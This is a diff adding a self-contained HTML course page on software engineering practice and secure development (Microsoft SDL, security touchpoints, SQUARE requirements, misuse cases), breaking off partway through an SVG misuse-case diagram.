@@ -1,0 +1,2056 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>software coding.docx</title>
+    <!-- 
+      This application is a single, self-contained HTML file.
+      It uses Tailwind CSS for styling and custom JavaScript for interactivity.
+      No external libraries are needed beyond the Tailwind CDN.
+    -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        /*
+         * SOLARIZED THEMES
+         * We define CSS variables for both light and dark themes.
+         * The 'theme-toggle' script will switch the class on the <body>.
+         */
+
+        /* Solarized Light Theme (Default) */
+        :root {
+            --base03: #002b36; /* Used for dark text on light bg */
+            --base02: #073642;
+            --base01: #586e75;
+            --base00: #657b83;
+            --base0: #839496;
+            --base1: #93a1a1;
+            --base2: #eee8d5; /* Used for light bg */
+            --base3: #fdf6e3; /* Used for main light bg */
+            --yellow: #b58900;
+            --orange: #cb4b16;
+            --red: #dc322f;
+            --magenta: #d33682;
+            --violet: #6c71c4;
+            --blue: #268bd2;
+            --cyan: #2aa198;
+            --green: #859900;
+
+            /* Semantic variables */
+            --bg-main: var(--base3);
+            --bg-accent: var(--base2);
+            --text-main: var(--base02);
+            --text-muted: var(--base01);
+            --text-heading: var(--base03);
+            --text-link: var(--blue);
+            --text-link-hover: var(--orange);
+            --border-main: var(--base2);
+            --btn-bg: var(--blue);
+            --btn-text: var(--base3);
+            --btn-hover-bg: var(--cyan);
+            --code-bg: var(--base2);
+            --code-text: var(--base01);
+            --output-bg: white;
+            --output-border: var(--base1);
+        }
+
+        /* Solarized Dark Theme */
+        .dark-theme {
+            --base03: #002b36; /* Used for main dark bg */
+            --base02: #073642; /* Used for dark bg */
+            --base01: #586e75;
+            --base00: #657b83;
+            --base0: #839496; /* Used for light text */
+            --base1: #93a1a1; /* Used for main light text */
+            --base2: #eee8d5;
+            --base3: #fdf6e3;
+            
+            /* Semantic variables for dark mode */
+            --bg-main: var(--base03);
+            --bg-accent: var(--base02);
+            --text-main: var(--base1);
+            --text-muted: var(--base0);
+            --text-heading: var(--base2);
+            --text-link: var(--blue);
+            --text-link-hover: var(--orange);
+            --border-main: var(--base01);
+            --btn-bg: var(--blue);
+            --btn-text: var(--base3);
+            --btn-hover-bg: var(--cyan);
+            --code-bg: var(--base02);
+            --code-text: var(--base1);
+            --output-bg: var(--base02);
+            --output-border: var(--base00);
+        }
+
+        /* Apply themed colors */
+        body {
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        h1, h2, h3, h4, h5, h6 {
+            color: var(--text-heading);
+            font-weight: 600;
+        }
+        
+        a {
+            color: var(--text-link);
+            text-decoration: underline;
+        }
+        a:hover {
+            color: var(--text-link-hover);
+        }
+
+        summary {
+            cursor: pointer;
+            color: var(--text-heading);
+            font-size: 1.25rem;
+            font-weight: 600;
+            padding: 0.5rem 0;
+            border-bottom: 2px solid var(--border-main);
+        }
+
+        details > div {
+            padding-top: 1rem;
+        }
+
+        /* Sticky Header/Nav */
+        .sticky-header {
+            position: sticky;
+            top: 0;
+            z-index: 50;
+            background-color: var(--bg-accent);
+            border-bottom: 2px solid var(--border-main);
+        }
+        .sticky-nav {
+            position: sticky;
+            top: 66px; /* Height of the header */
+            z-index: 40;
+            background-color: var(--bg-main);
+            border-bottom: 2px solid var(--border-main);
+            padding: 0.5rem 0;
+        }
+
+        /* Main Content Pages */
+        .main-content-page {
+            display: none; /* Hidden by default, JS will show the active one */
+        }
+        #lecture-content {
+            display: block; /* Show lecture content by default */
+        }
+
+        /* Theme Switcher Toggle */
+        .theme-switch-wrapper {
+            display: flex;
+            align-items: center;
+        }
+        .theme-switch {
+            display: inline-block;
+            height: 24px;
+            position: relative;
+            width: 44px;
+        }
+        .theme-switch input {
+            display: none;
+        }
+        .slider {
+            background-color: var(--base01);
+            bottom: 0;
+            cursor: pointer;
+            left: 0;
+            position: absolute;
+            right: 0;
+            top: 0;
+            transition: .4s;
+            border-radius: 24px;
+        }
+        .slider:before {
+            background-color: var(--base2);
+            bottom: 4px;
+            content: "";
+            height: 16px;
+            left: 4px;
+            position: absolute;
+            transition: .4s;
+            width: 16px;
+            border-radius: 50%;
+        }
+        input:checked + .slider {
+            background-color: var(--blue);
+        }
+        input:checked + .slider:before {
+            transform: translateX(20px);
+        }
+
+        /* Password Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.6);
+        }
+        .modal-content {
+            background-color: var(--bg-main);
+            color: var(--text-main);
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid var(--border-main);
+            width: 90%;
+            max-width: 400px;
+            border-radius: 8px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        .modal-content input[type="password"],
+        .modal-content input[type="text"] {
+            background-color: var(--bg-accent);
+            color: var(--text-main);
+            border: 1px solid var(--border-main);
+        }
+        .modal-close-btn {
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            z-index: -1;
+        }
+
+        /* Python Runner */
+        .python-runner {
+            background-color: var(--code-bg);
+            color: var(--code-text);
+            border-radius: 8px;
+            margin-top: 1rem;
+        }
+        .python-runner pre {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            padding: 1rem;
+            border-radius: 8px 8px 0 0;
+        }
+        .python-runner-controls {
+            background-color: var(--bg-accent);
+            padding: 0.5rem 1rem;
+            border-top: 1px solid var(--border-main);
+        }
+        .python-runner-output {
+            display: none; /* Hidden by default */
+            background-color: var(--output-bg);
+            color: var(--text-main);
+            border: 1px dashed var(--output-border);
+            padding: 1rem;
+            margin: 1rem;
+            border-radius: 4px;
+            font-family: monospace;
+        }
+        .python-runner-output pre,
+        .python-runner-output code {
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            margin: 0;
+            padding: 0;
+            background: none;
+            color: inherit;
+        }
+        
+        /* Utility Button */
+        .btn {
+            background-color: var(--btn-bg);
+            color: var(--btn-text);
+            padding: 0.5rem 1rem;
+            border-radius: 6px;
+            font-weight: 500;
+            transition: background-color 0.2s ease;
+        }
+        .btn:hover {
+            background-color: var(--btn-hover-bg);
+        }
+        .btn-secondary {
+            background-color: var(--base01);
+        }
+        .btn-secondary:hover {
+            background-color: var(--base00);
+        }
+
+        /* Answer Box */
+        .answer-box {
+            min-height: 150px;
+            width: 100%;
+            background-color: var(--bg-accent);
+            border: 1px solid var(--border-main);
+            border-radius: 6px;
+            padding: 1rem;
+            color: var(--text-main);
+            margin-top: 1rem;
+        }
+        .answer-box:focus {
+            outline: 2px solid var(--blue);
+            border-color: var(--blue);
+        }
+        .answer-box img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 4px;
+        }
+        
+        /* Submission Section Inputs */
+        .submission-input {
+            background-color: var(--bg-accent);
+            color: var(--text-main);
+            border: 1px solid var(--border-main);
+            border-radius: 6px;
+            padding: 0.5rem 1rem;
+        }
+        .submission-input:focus {
+            outline: 2px solid var(--blue);
+        }
+
+        /* Hide UI elements when printing */
+        @media print {
+            .no-print {
+                display: none !important;
+            }
+            .sticky-header, .sticky-nav, #submit-work-section {
+                display: none !important;
+            }
+            .main-content-page {
+                display: block !important;
+            }
+            details {
+                page-break-inside: avoid;
+            }
+            details[open] {
+                padding-bottom: 1rem;
+            }
+            summary {
+                border-bottom: 2px solid #000;
+            }
+            .python-runner {
+                border: 1px solid #ccc;
+            }
+        }
+    </style>
+</head>
+<body class="text-base">
+
+    <!-- 
+      PASSWORD MODAL
+      This modal is used to gate access to the "Answers" section.
+    -->
+    <div id="password-modal" class="modal no-print">
+        <!-- This button covers the whole screen to close the modal when clicked outside -->
+        <div class="modal-close-btn" onclick="document.getElementById('password-modal').style.display='none'"></div>
+        
+        <div class="modal-content relative z-10">
+            <h3 class="text-lg font-bold mb-4">Password Required</h3>
+            <p class="text-sm">Please enter the password to view the answers.</p>
+            <p class="text-sm">If you want to Cancel the action, click outside the "Password Required" box.</p>
+            <p class="text-sm mb-4">You can see the entered password by clicking on the "eye" icon.</p>
+            
+            <div class="relative">
+                <input type="password" id="password-input" class="w-full p-2 rounded-md">
+                <button id="toggle-password" class="absolute top-1/2 right-3 -translate-y-1/2 text-lg">
+                    <!-- SVG Eye Icon -->
+                    <svg id="eye-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-eye-fill" viewBox="0 0 16 16">
+                      <path d="M10.5 8a2.5 2.5 0 1 1-5 0 2.5 2.5 0 0 1 5 0z"/>
+                      <path d="M0 8s3-5.5 8-5.5S16 8 16 8s-3 5.5-8 5.5S0 8 0 8zm8 3.5a3.5 3.5 0 1 0 0-7 3.5 3.5 0 0 0 0 7z"/>
+                    </svg>
+                    <!-- SVG Eye-Slash Icon (hidden by default) -->
+                    <svg id="eye-slash-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-eye-slash-fill hidden" viewBox="0 0 16 16">
+                      <path d="m10.79 12.912-1.614-1.615a3.5 3.5 0 0 1-4.474-4.474l-2.06-2.06C.938 6.278 0 8 0 8s3 5.5 8 5.5a7.029 7.029 0 0 0 2.79-.588zM5.21 3.088A7.028 7.028 0 0 1 8 2.5c5 0 8 5.5 8 5.5s-.939 1.721-2.641 3.238l-2.062-2.062a3.5 3.5 0 0 0-4.474-4.474L5.21 3.089z"/>
+                      <path d="M5.525 7.646a2.5 2.5 0 0 0 2.829 2.829l-2.83-2.829zm4.95.708-2.829-2.83a2.5 2.5 0 0 1 2.829 2.829zm3.171 6-12-12 .708-.708 12 12-.708.708z"/>
+                    </svg>
+                </button>
+            </div>
+            
+            <p id="password-error" class="text-red-500 text-sm mt-2 hidden">Incorrect password. Please try again.</p>
+            <button id="password-submit" class="btn w-full mt-4">Submit</button>
+        </div>
+    </div>
+    
+    <!-- 
+      FILE IMPORT ERROR MODAL
+      This modal is used to show a message if a file can't be imported.
+    -->
+    <div id="import-error-modal" class="modal no-print">
+        <div class="modal-close-btn" onclick="document.getElementById('import-error-modal').style.display='none'"></div>
+        <div class="modal-content relative z-10">
+            <h3 class="text-lg font-bold mb-4">Import Error</h3>
+            <p id="import-error-message" class="mb-4">Could not import the selected file.</p>
+            <button onclick="document.getElementById('import-error-modal').style.display='none'" class="btn w-full">OK</button>
+        </div>
+    </div>
+    
+    <!-- This hidden input is used for all file import buttons -->
+    <input type="file" id="file-importer" class="hidden" accept="image/*, .txt, .md, .html">
+
+    <!-- 
+      STICKY HEADER
+      Contains title, expand/collapse, and theme switch.
+    -->
+    <header class="sticky-header p-4 no-print">
+        <div class="container mx-auto flex justify-between items-center">
+            <!-- Left Side: Title -->
+            <h1 class="text-xl font-bold truncate">software coding.docx</h1>
+
+            <!-- Right Side: Controls -->
+            <div class="flex items-center space-x-4">
+                <button id="expand-all" class="btn btn-secondary text-sm">Expand All</button>
+                <button id="collapse-all" class="btn btn-secondary text-sm">Collapse All</button>
+                
+                <div class="theme-switch-wrapper">
+                    <label class="theme-switch" for="theme-checkbox">
+                        <input type="checkbox" id="theme-checkbox" />
+                        <span class="slider"></span>
+                    </label>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- 
+      STICKY NAVIGATION
+      The main menu for switching content sections.
+    -->
+    <nav class="sticky-nav no-print">
+        <div class="container mx-auto">
+            <ul class="flex flex-wrap justify-center gap-x-6 gap-y-2">
+                <li><a href="#lecture-content" class="nav-link font-medium text-lg">Lecture</a></li>
+                <li><a href="#exercises-content" class="nav-link font-medium text-lg">Exercises</a></li>
+                <li><a href="#tips-content" class="nav-link font-medium text-lg">Tips</a></li>
+                <li><a href="#explanations-content" class="nav-link font-medium text-lg">Explanations</a></li>
+                <li><a href="#answers-content" id="nav-link-answers" class="nav-link font-medium text-lg">Answers</a></li>
+                <li><a href="#evaluation-grid-content" class="nav-link font-medium text-lg">Evaluation Grid</a></li>
+            </ul>
+        </div>
+    </nav>
+
+    <!-- 
+      MAIN CONTENT AREA
+      Each section is a "page" that is shown/hidden by JS.
+    -->
+    <main class="container mx-auto p-4 md:p-8">
+
+        <!-- ****************** LECTURE SECTION ****************** -->
+        <section id="lecture-content" class="main-content-page space-y-6">
+            <details open>
+                <summary>Table of Contents</summary>
+                <div class="prose max-w-none">
+                    <ul>
+                        <li>Part 1: The Foundation - Principles That Guide Practice</li>
+                        <li>Part 2: The Fortress - Software Security Engineering</li>
+                    </ul>
+                </div>
+            </details>
+            
+            <details>
+                <summary>Part 1: The Foundation - Principles That Guide Practice (Approx. 60 Minutes)</summary>
+                <div>
+                    <h2>1. Introduction to Software Engineering Practice</h2>
+                    <p class="mt-2">Welcome. Today, we begin by establishing the fundamental principles that govern all good software development. Before we can secure software, we must first understand how to build it in a disciplined, effective manner.</p>
+                    
+                    <h3 class="mt-4">What is "Practice"?</h3>
+                    <p class="mt-2">In software engineering, "practice" is the collection of concepts, principles, methods, and tools that we apply daily. It's what transforms a chaotic, haphazard approach into an organized, effective process that is likely to succeed. This practice is our roadmap, and the principles are the rules of the road.</p>
+
+                    <h3 class="mt-4">Core Principles: Process</h3>
+                    <p class="mt-2">These principles guide the <strong>overall flow</strong> of a software project.</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Be Agile:</strong> Adapt to change. Keep your technical approach simple and make decisions locally.</li>
+                        <li><strong>Focus on Quality at Every Step:</strong> Quality isn't an afterthought; it's the exit condition for every task.</li>
+                        <li><strong>Be Ready to Adapt:</strong> A process is a guide, not a rigid set of rules. Adapt your approach to the problem, the people, and the project.</li>
+                        <li><strong>Build an Effective Team:</strong> Software development is a human activity. A self-organizing team built on trust and respect is paramount.</li>
+                        <li><strong>Establish Mechanisms for Communication and Coordination:</strong> Projects fail when information is lost or teams don't coordinate.</li>
+                        <li><strong>Manage Change:</strong> You must have a defined process (formal or informal) for how changes are requested, assessed, approved, and implemented.</li>
+                        <li><strong>Assess Risk:</strong> Identify what can go wrong and establish contingency plans. This is the gateway to security engineering.</li>
+                        <li><strong>Create Work Products That Provide Value:</strong> Don't create documentation or models just for the sake of it. Every work product should serve a clear purpose for another person or task.</li>
+                    </ul>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Core Process Principle (Manage Change)</strong><br>
+                        <strong>Task:</strong> A client requests a new "Dark Mode" feature for a mobile app, one month before the scheduled launch.<br>
+                        <strong>Relation to Lecture:</strong> This illustrates the "Manage Change" principle. Instead of just saying "yes" (and risking the deadline) or "no" (and upsetting the client), the team uses a change management process. They assess the request: How long will it take? What other features must be delayed? What is the cost? They present these options to the client, who can then make an informed decision. This avoids chaos and manages expectations.
+                    </div>
+
+                    <h3 class="mt-4">Core Principles: Practice</h3>
+                    <p class="mt-2">These principles guide the <strong>technical work</strong> of analysis, design, and coding.</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Divide and Conquer (Separation of Concerns - SoC):</strong> A large problem is easier to solve if you break it into smaller, manageable, independent pieces.</li>
+                        <li><strong>Understand the Use of Abstraction:</strong> An abstraction is a simplification of a complex element. We use abstractions (like "user login module") to communicate meaning without getting lost in the low-level details.</li>
+                        <li><strong>Strive for Consistency:</strong> A familiar context (in design, code, and UI) makes software easier to build, use, and maintain.</li>
+                        <li><strong>Focus on the Transfer of Information:</strong> Software is all about information flow (e.g., user to UI, component to component, app to database). Interfaces where this transfer happens are primary locations for errors and vulnerabilities.</li>
+                        <li><strong>Build Software That Exhibits Effective Modularity:</strong> This is how we <em>achieve</em> Separation of Concerns. Modules should have a single, well-defined purpose and be loosely coupled.</li>
+                        <li><strong>Look for Patterns:</strong> Catalog and reuse solutions to common problems (e.g., design patterns).</li>
+                        <li><strong>Represent the Problem from Different Perspectives:</strong> Use different models (e.g., user stories, UML diagrams) to get a complete picture and uncover errors.</li>
+                        <li><strong>Remember That Someone Will Maintain the Software:</strong> Write clear, understandable, and maintainable code. The majority of software's cost is in its maintenance.</li>
+                    </ul>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Core Practice Principle (Divide and Conquer)</strong><br>
+                        <strong>Task:</strong> Building a complex e-commerce website.<br>
+                        <strong>Relation to Lecture:</strong> This illustrates "Divide and Conquer" or "Separation of Concerns." Instead of one giant program, you divide the problem into smaller, logical modules:
+                        A <em>User Authentication</em> module, a <em>Product Catalog</em> module, a <em>Shopping Cart</em> module, and a <em>Checkout</em> module. Each module can be built, tested, and maintained independently, making the entire system far easier to manage.
+                    </div>
+                </div>
+            </details>
+
+            <details>
+                <summary>2. Guiding Principles for Framework Activities</summary>
+                <div>
+                    <p>Let's briefly look at how these core ideas apply to the specific phases of a project.</p>
+                    <h3 class="mt-4">Communication Principles</h3>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Principle 1. Listen:</strong> Focus on what the speaker is saying, not what you're going to say next.</li>
+                        <li><strong>Principle 4. Face-to-face communication is best:</strong> It has the highest "bandwidth" for conveying information.</li>
+                        <li><strong>Principle 8. If something is unclear, draw a picture:</strong> Visual models resolve ambiguity faster than words.</li>
+                        <li><strong>Principle 10. Negotiation is not a contest:</strong> It's a search for a win-win outcome.</li>
+                    </ul>
+
+                    <h3 class="mt-4">Planning Principles</h3>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Principle 1. Understand the scope:</strong> You can't plan a trip if you don't know the destination.</li>
+                        <li><strong>Principle 3. Recognize that planning is iterative:</strong> A plan is a living document that must be adjusted as you learn more.</li>
+                        <li><strong>Principle 5. Consider risk as you define the plan:</strong> Allocate time and resources for what might go wrong.</li>
+                    </ul>
+
+                    <h3 class="mt-4">Modeling Principles</h3>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Principle 1. The primary goal is to build software, not create models:</strong> Models are a means to an end.</li>
+                        <li><strong>Principle 3. Strive to produce the simplest model:</strong> Don't over-engineer your model.</li>
+                        <li><strong>Principle 10. Get feedback as soon as you can:</strong> A model's purpose is to communicate. See if it's successful by showing it to others.</li>
+                    </ul>
+
+                    <h3 class="mt-4">Construction Principles</h3>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Preparation:</strong> Understand the problem and the design <em>before</em> you write code. Create unit tests before or alongside the code.</li>
+                        <li><strong>Coding:</strong> Use structured programming. Consider pair programming. Create interfaces consistent with the architecture.</li>
+                        <li><strong>Validation:</strong> Conduct code walkthroughs. Perform unit tests. <strong>Refactor</strong> (clean up) code to improve its quality <em>after</em> it works.</li>
+                    </ul>
+
+                    <h3 class="mt-4">Deployment Principles</h3>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Principle 1. Customer expectations for the software must be managed:</strong> Be clear and honest about what the software increment does and does not do.</li>
+                        <li><strong>Principle 3. A support regimen must be established <em>before</em> delivery:</strong> Users will have questions. Be ready to answer them.</li>
+                        <li><strong>Principle 5. Buggy software should be fixed first, delivered later:</strong> A high-quality product delivered a few days late is better than a low-quality product delivered on time.</li>
+                    </ul>
+                </div>
+            </details>
+
+            <details>
+                <summary>Part 2: The Fortress - Software Security Engineering (Approx. 120 Minutes)</summary>
+                <div>
+                    <h2>3. The Imperative for Software Security</h2>
+                    <h3 class="mt-4">Why Software Security Engineering is Critical</h3>
+                    <p class="mt-2">Software is no longer just on our desktops. It is in our cars, our appliances, our financial systems, and even our medical devices (e.g., pacemakers). Every piece of software has the potential to be attacked, and the consequences are no longer just an error message. They can include:</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li>Financial loss (theft, fraud)</li>
+                        <li>Loss of private data (identity theft)</li>
+                        <li>Damage to critical infrastructure (power grids, water supplies)</li>
+                        <li>Loss of reputation and customer trust</li>
+                        <li>Physical harm or even loss of life</li>
+                    </ul>
+                    <p class="mt-2">Software security is not just about firewalls and antivirus software. That is <em>operational</em> security. We are talking about <strong>software security engineering</strong>: the process of building software to be secure from the very beginning.</p>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Importance of Security Engineering</strong><br>
+                        <strong>Task:</strong> A company manufactures a "smart" car that receives over-the-air (OTA) software updates.<br>
+                        <strong>Relation to Lecture:</strong> This illustrates why <em>software engineering</em> must be secure. If the company only relies on <em>operational</em> security (e.g., the car's internal firewall), an attacker could find a vulnerability in the update mechanism itself. By compromising the update server or the car's validation code, an attacker could push a malicious update to an entire fleet of cars, potentially disabling their brakes or steering. Secure engineering (e.g., code-signing, encrypted communication, secure coding) is required to prevent this.
+                    </div>
+
+                    <h2 class="mt-6">4. Building Security In: Life-Cycle Models</h2>
+                    <p class="mt-2">To build secure software, we must integrate security activities into every phase of our development life cycle.</p>
+                    <h3 class="mt-4">The Microsoft Security Development Lifecycle (SDL)</h3>
+                    <p class="mt-2">One of the most well-known and mandatory processes, the Microsoft SDL, embeds security and privacy into all phases of development. It is guided by four core principles, known as <strong>SD3+C</strong>:</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Secure by Design:</strong> Security is part of the basic architecture. Threat modeling is performed, and vulnerabilities are eliminated during design, not after.</li>
+                        <li><strong>Secure by Default:</strong> The "out-of-the-box" configuration is the most secure one. This means applying the <em>Principle of Least Privilege</em> and turning off features that are not commonly used.</li>
+                        <li><strong>Secure in Deployment:</strong> The software comes with tools and guides to help administrators deploy and manage it securely. This includes secure patch deployment.</li>
+                        <li><strong>Communications:</strong> The team must be transparent and responsive, promptly addressing reports of new vulnerabilities and communicating updates to users.</li>
+                    </ul>
+                    
+                    <h3 class="mt-4">Software Security Touchpoints</h3>
+                    <p class="mt-2">For those not using a rigid, prescriptive model like the SDL, the "Touchpoints" model is a process-agnostic set of key security activities. The idea is to apply these "touchpoints" to <em>any</em> process model (like Agile or DevOps).</p>
+                    <p class="mt-2">The key touchpoints include:</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li>Code Review (for security): Manually and automatically inspecting code for security flaws.</li>
+                        <li>Risk Analysis: Understanding the threats and prioritizing them.</li>
+                        <li>Penetration Testing: "Ethical hacking" to find vulnerabilities before real attackers do.</li>
+                        <li>Abuse Cases: Thinking about how an attacker would try to misuse the system.</li>
+                        <li>Security Requirements: Defining "what not to do" as part of the initial requirements.</li>
+                    </ul>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Secure by Default</strong><br>
+                        <strong>Task:</strong> Installing a new database server (like PostgreSQL or MySQL).<br>
+                        <strong>Relation to Lecture:</strong> This illustrates the "Secure by Default" principle. In the past, this software might have installed with a default administrator account (e.g., 'root') and a blank or simple password. A modern, secure-by-default installer <em>forces</em> you to create a strong, unique password for the administrator account during installation and may, by default, only allow connections from the local machine, not from the network.
+                    </div>
+                </div>
+            </details>
+
+            <details>
+                <summary>5. Core Secure Development Activities</summary>
+                <div>
+                    <p>Let's dive deeper into the most important activities for building secure software.</p>
+                    <h3 class="mt-4">Security Requirements Engineering (SQUARE)</h3>
+                    <p class="mt-2">You cannot build a secure system if you don't know what "secure" means for your project. The <strong>SQUARE (Security QUAlity Requirements Engineering)</strong> process is one model for gathering them. Its key steps include:</p>
+                    <ol class="list-decimal list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Agree on Definitions:</strong> Ensure everyone (developers, stakeholders) means the same thing by terms like "confidentiality" or "integrity."</li>
+                        <li><strong>Identify Assets and Security Goals:</strong> What are you trying to protect (e.g., user data, financial records)?</li>
+                        <li><strong>Develop Artifacts:</strong> Gather documents like network diagrams or system architectures.</li>
+                        <li><strong>Perform Risk Assessment:</strong> Identify threats to the assets and prioritize them.</li>
+                        <li><strong>Select Elicitation Technique:</strong> Decide <em>how</em> you will gather requirements (e.g., interviews, misuse cases).</li>
+                        <li><strong>Elicit Security Requirements:</strong> The actual process of gathering the requirements (e.g., "The system <em>must not</em> store user passwords in plain text.").</li>
+                        <li><strong>Categorize Requirements:</strong> Group requirements (e.g., essential vs. desired).</li>
+                        <li><strong>Prioritize Requirements:</strong> Decide which security requirements are most critical to implement first.</li>
+                        <li><strong>Requirements Inspection:</strong> Review the requirements for correctness and completeness.</li>
+                    </ol>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Identifying Assets and Security Goals (SQUARE Step 2)</strong><br>
+                        <strong>Task:</strong> Designing a new mobile banking application.<br>
+                        <strong>Relation to Lecture:</strong> Applying this SQUARE step, the team meets with bank stakeholders.<br>
+                        - <strong>Stakeholder 1 (Compliance Officer):</strong> "Our most important asset is the <em>customer's personal data</em>. Our security goal is <em>Confidentiality</em>."<br>
+                        - <strong>Stakeholder 2 (Head of Operations):</strong> "My most important asset is the <em>transaction ledger</em>. My security goal is <em>Integrity</em>."<br>
+                        - <strong>Stakeholder 3 (Customer Rep):</strong> "My goal is <em>Availability</em>. The system <em>must</em> be available 24/7."<br>
+                        The team now has clear, and sometimes competing, security goals to build requirements from.
+                    </div>
+
+                    <h3 class="mt-4">Misuse Cases, Abuse Cases, and Attack Patterns</h3>
+                    <p class="mt-2">If a <strong>Use Case</strong> describes how a legitimate user interacts with a system, a <strong>Misuse Case</strong> describes how an <em>attacker</em> interacts with it.</p>
+                    <ul class="list-disc list-outside ml-6 mt-2 space-y-1">
+                        <li><strong>Misuse Case:</strong> A use case from the attacker's perspective (e.g., "Attacker bypasses login").</li>
+                        <li><strong>Attack Pattern:</strong> A "blueprint" for an attack, documenting the common steps.</li>
+                    </ul>
+                    <p class="mt-2">Creating misuse cases helps you think like an attacker and build defenses proactively.</p>
+                    <div class="mt-4 p-4 border-l-4" style="border-color: var(--cyan); background-color: var(--bg-accent);">
+                        <strong>Example: Misuse Case Diagram</strong><br>
+                        <strong>Task:</strong> Diagramming the login process and its potential for abuse.<br>
+                        <strong>Relation to Lecture:</strong> This SVG diagram illustrates a simple misuse case. The <em>User</em> has a use case <em>Login</em>. The <em>Attacker</em> has two misuse cases: <em>Brute-force Password</em> and <em>Intercept Traffic</em>, both of which threaten the <em>Login</em> use case. The system must now include <em>mitigations</em> for these threats, such as <em>Enforce Account Lockout</em> and <em>Use HTTPS</em>.
+                    </div>
+                    <!-- Embedded SVG from the document -->
+                    <div class="my-4 flex justify-center">
+                        <svg width="500" height="300" xmlns="http://www.w3.org/2000/svg" style="background-color: var(--bg-main); border: 1px solid var(--border-main); border-radius: 8px; font-family: 'Inter', sans-serif;">
+                            <style>
+                                /* Style SVG text elements to respect theme */
+                                svg text { fill: var(--text-main); }
+                                svg #actor_user text { font-weight: bold; }
+                                svg #actor_attacker text { fill: var(--red); font-weight: bold; }
+                                svg .use-case-normal { fill: #e0ffe0; stroke: var(--green); }
+                                svg .use-case-misuse { fill: #ffe0e0; stroke: var(--red); }
+                                svg .actor-line { stroke: var(--text-main); }
+                                svg .actor-head { fill: var(--bg-main); stroke: var(--text-main); }
+                                svg .attacker-line { stroke: var(--text-main); }
+                                svg .attacker-head { fill: var(--text-main); stroke: var(--red); }
+                                svg .link-line { stroke: var(--text-main); }
+                                svg .threat-line { stroke: var(--red); stroke-dasharray: 5,5; }
+                                svg .threat-text { fill: var(--red); font-style: italic; }
+                            </style>
+                            <!-- Actors -->
+                            <g id="actor_user">
+                                <circle cx="70" cy="110" r="20" class="actor-head" stroke-width="2"/>
+                                <line x1="70" y1="130" x2="70" y2="170" class="actor-line" stroke-width="2"/>
+                                <line x1="70" y1="145" x2="50" y2="130" class="actor-line" stroke-width="2"/>
+                                <line x1="70" y1="145" x2="90" y2="130" class="actor-line" stroke-width="2"/>
+                                <line x1="70" y1="170" x2="50" y2="190" class="actor-line" stroke-width="2"/>
+                                <line x1="70" y1="170" x2="90" y2="190" class="actor-line" stroke-width="2"/>
+                                <text x="70" y="215" text-anchor="middle">User</text>
+                            </g>
+                            <g id="actor_attacker">
+                                <circle cx="430" cy="110" r="20" class="attacker-head" stroke-width="2"/>
+                                <line x1="430" y1="130" x2="430" y2="170" class="attacker-line" stroke-width="2"/>
+                                <line x1="430" y1="145" x2="410" y2="130" class="attacker-line" stroke-width="2"/>
+                                <line x1="430" y1="145" x2="450" y2="130" class="attacker-line" stroke-width="2"/>
+                                <line x1="430" y1="170" x2="410" y2="190" class="attacker-line" stroke-width="2"/>
+                                <line x1="430" y1="170" x2="450" y2="190" class="attacker-line" stroke-width="2"/>
+                                <text x="430" y="215" text-anchor="middle">Attacker</text>
+                            </g>
+                            <!-- Use Cases -->
+                            <ellipse cx="250" cy="50" rx="100" ry="25" class="use-case-normal" stroke-width="2"/>
+                            <text x="250" y="55" text-anchor="middle">Login</text>
+                            <ellipse cx="250" cy="130" rx="100" ry="25" class="use-case-misuse" stroke-width="2"/>
+                            <text x="250" y="135" text-anchor="middle">Brute-force Password</text>
+                            <ellipse cx="250" cy="210" rx="100" ry="25" class="use-case-misuse" stroke-width="2"/>
+                            <text x="250" y="215" text-anchor="middle">Intercept Traffic</text>
+                            <!-- Relationships -->
+                            <line x1="95" y1="115" x2="150" y2="65" class="link-line" stroke-width="1.5"/>
+                            <line x1="350" y1="65" x2="405" y2="115" class="threat-line" stroke-width="1.5"/>
+                            <text x="360" y="80" class="threat-text">&lt;&lt;threatens&gt;&gt;</text>
+                            <line x1="350" y1="130" x2="405" y2="115" class="link-line" stroke-width="1.5"/>
